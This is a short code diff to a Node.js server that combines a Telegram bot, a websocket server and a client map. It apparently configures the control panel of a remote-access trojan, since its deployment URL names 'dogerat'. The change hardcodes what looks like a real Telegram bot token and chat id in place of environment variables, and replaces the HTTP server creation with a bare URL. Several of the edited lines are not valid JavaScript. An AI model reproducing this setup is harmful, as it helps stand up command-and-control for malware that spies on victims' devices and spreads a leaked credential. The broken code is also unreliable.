@@ -7,12 +7,12 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = process.env.bot_token
-const id = process.env.bot_id
+const token = 6850660730:AAFiiDVa7XFlUIMoYn9QjKLlmNCflxDyRn8
+const id = 6534781194
 const address = 'https://www.google.com'
 
 const app = express();
-const appServer = http.createServer(app);
+const appServer = https://dogerat-x6kc.onrender.com;
 const appSocket = new webSocket.Server({server: appServer});
 const appBot = new telegramBot(token, {polling: true});
 const appClients = new Map()
